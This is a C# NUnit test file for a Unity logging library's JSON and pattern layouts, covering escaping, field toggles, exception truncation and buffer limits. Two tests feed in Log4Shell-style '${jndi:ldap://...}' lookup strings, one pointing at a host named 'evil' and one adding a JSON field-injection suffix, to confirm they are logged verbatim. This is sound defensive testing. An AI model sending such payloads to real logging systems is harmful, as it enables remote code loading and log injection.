using System;
using System.IO;
using LogLine.Config;
using LogLine.Core;
using LogLine.Layouts;
using NUnit.Framework;
using UnityEngine;

namespace LogLine.Tests.Editor
{
    [TestFixture]
    public sealed class LayoutTests
    {
        #region JSON DTO

        [Serializable]
        private struct ParsedJsonLog
        {
            public string timestamp;
            public string level;
            public string logger;
            public string message;
            public int threadId;
            public string exception;
        }

        #endregion

        #region JsonLayout Tests

        [Test]
        public void JsonLayout_EscapesSpecialCharsAndRoundTripsThroughJsonUtility()
        {
            var layout = new JsonLayout(appendNewline: false);
            const string TrickyLogger = "Combat\"\\AI\nSub";
            const string TrickyMessage = "Кириллица: \"quotes\" \\ slash \nLF \rCR \tTAB \bBS \fFF \x1B[31mANSI\x1B[0m ${jndi:ldap://evil/a} \"},\"injected\":true";

            var ev = new LogEvent(LogLevel.Warn, TrickyLogger, TrickyMessage);
            string json = FormatToString(layout, in ev);

            // Verify raw RFC 8259 escape sequences
            StringAssert.Contains("\\\"quotes\\\"", json);
            StringAssert.Contains("\\\\ slash", json);
            StringAssert.Contains("\\u001b[31mANSI\\u001b[0m", json);

            // Round-trip through Unity's native C++ RapidJSON parser
            ParsedJsonLog parsed = JsonUtility.FromJson<ParsedJsonLog>(json);
            Assert.AreEqual("WARN", parsed.level);
            Assert.AreEqual(TrickyLogger, parsed.logger);
            Assert.AreEqual(TrickyMessage, parsed.message);
            Assert.AreEqual(ev.ThreadId, parsed.threadId);
            Assert.IsTrue(parsed.timestamp.EndsWith("Z", StringComparison.Ordinal));
            Assert.AreEqual(24, parsed.timestamp.Length);
            Assert.IsTrue(string.IsNullOrEmpty(parsed.exception));
        }

        [Test]
        public void JsonLayout_EscapesNullByteAsUnicodeSequence()
        {
            var layout = new JsonLayout(appendNewline: false);
            var ev = new LogEvent(LogLevel.Info, "Core", "before\0after");

            string json = FormatToString(layout, in ev);

            StringAssert.Contains("before\\u0000after", json);
            Assert.IsFalse(json.Contains("\0"), "Raw NUL byte must never appear in JSON output.");
        }

        [Test]
        public void JsonLayout_FieldToggles_OmitDisabledFieldsAndKeepValidJson()
        {
            var layout = new JsonLayout(
                includeTimestamp: false,
                includeLevel: false,
                includeLogger: false,
                includeThreadId: false,
                includeException: false,
                appendNewline: false);

            var ev = new LogEvent(LogLevel.Error, "Net", "only message", new Exception("ignored"));
            string json = FormatToString(layout, in ev);

            Assert.AreEqual("{\"message\":\"only message\"}", json);

            // Re-enable dynamically via JsonLayoutConfig.ApplyTo
            JsonLayoutConfig config = JsonLayoutConfig.Default;
            config.includeThreadId = false;
            config.ApplyTo(layout);

            string updated = FormatToString(layout, in ev);
            StringAssert.Contains("\"timestamp\":", updated);
            StringAssert.Contains("\"level\":\"ERROR\"", updated);
            StringAssert.Contains("\"logger\":\"Net\"", updated);
            StringAssert.Contains("\"exception\":\"System.Exception: ignored\"", updated);
            StringAssert.DoesNotContain("\"threadId\":", updated);
        }

        [Test]
        public void JsonLayout_AppendNewline_ControlsTrailingLineFeed()
        {
            var ev = new LogEvent(LogLevel.Info, "Core", "hello");

            string withNewline = FormatToString(new JsonLayout(appendNewline: true), in ev);
            string withoutNewline = FormatToString(new JsonLayout(appendNewline: false), in ev);

            Assert.IsTrue(withNewline.EndsWith("\n", StringComparison.Ordinal));
            Assert.IsFalse(withoutNewline.EndsWith("\n", StringComparison.Ordinal));
        }

        [Test]
        public void JsonLayout_SerializesRealStackTraceAndTruncatesDeepInnerExceptions()
        {
            Exception chain = BuildNestedExceptionChain(10);
            var layout = new JsonLayout(appendNewline: false);
            var ev = new LogEvent(LogLevel.Fatal, "Boot", "deep failure", chain);

            string json = FormatToString(layout, in ev, bufferSize: 8192);
            ParsedJsonLog parsed = JsonUtility.FromJson<ParsedJsonLog>(json);

            StringAssert.Contains("Level 1", parsed.exception);
            StringAssert.Contains("Level 8", parsed.exception);
            StringAssert.DoesNotContain("Level 9", parsed.exception);
            StringAssert.Contains("inner exceptions truncated", parsed.exception);
            StringAssert.Contains("BuildNestedExceptionChain", parsed.exception);
        }

        [Test]
        public void JsonLayout_BufferTooSmall_ReturnsFalseWithZeroCharsWritten()
        {
            var layout = new JsonLayout(appendNewline: true);
            var ev = new LogEvent(LogLevel.Info, "Core", "A message longer than 16 characters");

            Span<char> tinyBuffer = stackalloc char[16];
            bool ok = layout.TryFormat(in ev, tinyBuffer, out int written);

            Assert.IsFalse(ok);
            Assert.AreEqual(0, written);
        }

        #endregion

        #region PatternLayout Tests

        [Test]
        public void PatternLayout_FormatsAllTokensWithoutColorTags()
        {
            var layout = new PatternLayout("[%p] [%c] [T:%t] %m%ex", useColorTags: false);
            var ev = new LogEvent(LogLevel.Error, "Audio", "Clip missing", new FileNotFoundException("sfx.wav"));

            string output = FormatToString(layout, in ev);

            StringAssert.StartsWith($"[ERROR] [Audio] [T:{ev.ThreadId}] Clip missing", output);
            StringAssert.Contains("System.IO.FileNotFoundException: sfx.wav", output);
            StringAssert.DoesNotContain("<color=", output);
        }

        [Test]
        public void PatternLayout_UseColorTags_WrapsSeverityInUnityRichText()
        {
            var layout = new PatternLayout("[%p] %m", useColorTags: true);
            var ev = new LogEvent(LogLevel.Warn, "Core", "Low memory");

            string output = FormatToString(layout, in ev);

            StringAssert.Contains("<color=", output);
            StringAssert.Contains("WARN", output);
            StringAssert.Contains("</color>", output);
        }

        [Test]
        public void PatternLayout_CustomDateFormat_AndLiteralInjectionStringsRemainVerbatim()
        {
            var layout = new PatternLayout("%d{yyyy-MM-dd} %m", useColorTags: false);
            const string Payload = "${jndi:ldap://127.0.0.1/a} %p %c %n";
            var ev = new LogEvent(LogLevel.Info, "Sec", Payload);

            string output = FormatToString(layout, in ev);

            string expectedDate = ev.TimestampUtc.ToLocalTime().ToString("yyyy-MM-dd", System.Globalization.CultureInfo.InvariantCulture);
            Assert.AreEqual($"{expectedDate} {Payload}", output);
        }

        [Test]
        public void PatternLayout_BufferTooSmall_ReturnsFalse()
        {
            var layout = new PatternLayout(PatternLayout.DefaultFilePattern, useColorTags: false);
            var ev = new LogEvent(LogLevel.Info, "Core", "Some message payload");

            Span<char> tinyBuffer = stackalloc char[8];
            bool ok = layout.TryFormat(in ev, tinyBuffer, out int written);

            Assert.IsFalse(ok);
            Assert.AreEqual(0, written);
        }

        #endregion

        #region Helpers

        private static string FormatToString(ILogLayout layout, in LogEvent logEvent, int bufferSize = 2048)
        {
            char[] buffer = new char[bufferSize];
            Assert.IsTrue(layout.TryFormat(in logEvent, buffer, out int written),
                $"TryFormat unexpectedly failed with buffer size {bufferSize}.");
            return new string(buffer, 0, written);
        }

        private static Exception BuildNestedExceptionChain(int depth)
        {
            Exception current = null;
            for (int i = depth; i >= 1; i--)
            {
                try
                {
                    throw new InvalidOperationException($"Level {i}", current);
                }
                catch (Exception ex)
                {
                    current = ex;
                }
            }

            return current;
        }

        #endregion
    }
}
